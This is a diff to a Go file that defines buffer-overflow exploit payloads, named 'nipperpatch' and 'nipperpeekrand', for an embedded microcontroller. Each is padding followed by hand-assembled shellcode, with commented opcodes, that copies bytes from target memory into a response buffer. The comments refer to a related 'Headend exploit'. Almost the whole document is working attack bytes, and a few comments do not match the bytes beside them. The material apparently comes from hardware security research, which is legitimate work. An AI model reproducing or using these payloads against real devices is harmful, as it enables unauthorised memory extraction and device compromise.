@@ -106,7 +106,7 @@ func printhex(data []byte) {
 var nipperpatch = []byte{
 	/* Much of this is padding before the overflow.  We could put
 	shellcode here, and the Headend exploit does, but we'll need
-	to clobber that bufffer in sending our response.
+	to clobber that buffer in sending our response.
 	*/
 
 	0x01, 0x02, 0x03, 0xa4, 0x05, 0x06, 0x07, 0x08,
@@ -139,28 +139,23 @@ var nipperpatch = []byte{
 	*/
 
 	//This is the entry point for our shellcode.
-	0x9d, 0x9d, 0x9d,
-	0x9d, //NOP
+	0x9d, 0x9d, 0x9d, 0x9d, //NOPs
 
 	//Data begins at 0x19C+2.
 	0xAE, 0x21, //LD X, 0x20 ;
 	0x9d, 0x9d, //NOPs
 	//loop:
 	0xD6, 0xFF, 0xFF, //LD A, (target+1,X)  //Load the byte from the source buffer.
-	0xD7, 0x01, 0xA1, //STA (0x019C+1,X)  //Store the byte to the data buffer.
+	0xD7, 0x01, 0xA1, //STA (0x01A1+1,X)  //Store the byte to the data buffer.
 	0x5A,       //DEC X
 	0x2A, 0xF6, //JRPL loop  ; F6
 
-	//NOPs to keep alignment.
-	0x9d,
+	0x9d, //NOP
 
 	//Sends some data from the IO buffer.
 	0xa6, 0x93, //LDA #$93, response code
 	0xae, 0x40, //LDX #$17, length in data bytes
 	0xCD, 0x75, 0x7F, //JMP RESPONDAX to send the response.
-
-	//If we could re-inter the loop here, we could skip the call to reconnect() and run faster.
-	//0xCC, 0x73, 0x05, //Jump to startup.
 
 	//These three bytes will be clobbered.  Don't rely on them.
 	0x00, 0x00, 0x00,
@@ -172,7 +167,7 @@ var nipperpatch = []byte{
 var nipperpeekrand = []byte{
 	/* Much of this is padding before the overflow.  We could put
 	shellcode here, and the Headend exploit does, but we'll need
-	to clobber that bufffer in sending our response.
+	to clobber that buffer in sending our response.
 	*/
 
 	0x01, 0x02, 0x03, 0xa4, 0x05, 0x06, 0x07, 0x08,
@@ -204,10 +199,10 @@ var nipperpeekrand = []byte{
 	0xAE, 0x21, //LD X, 0x20 ; Length field.
 	//loop:
 	0xB6, 0x06, //LD A, (target+1,X)  //Load the high byte.
-	0xD7, 0x01, 0xA1, //STA (0x019C+1,X)  //Store the byte to the data buffer.
+	0xD7, 0x01, 0xA1, //STA (0x01A1+1,X)  //Store the byte to the data buffer.
 	0x5A,       //DEC X
 	0xB6, 0x07, //LD A, (target+1,X)  //Load the low byte.
-	0xD7, 0x01, 0xA1, //STA (0x019C+1,X)  //Store the byte to the data buffer.
+	0xD7, 0x01, 0xA1, //STA (0x01A1+1,X)  //Store the byte to the data buffer.
 	0x5A,       //DEC X
 	0x2A, 0xF1, //JRPL loop  ; F6
 
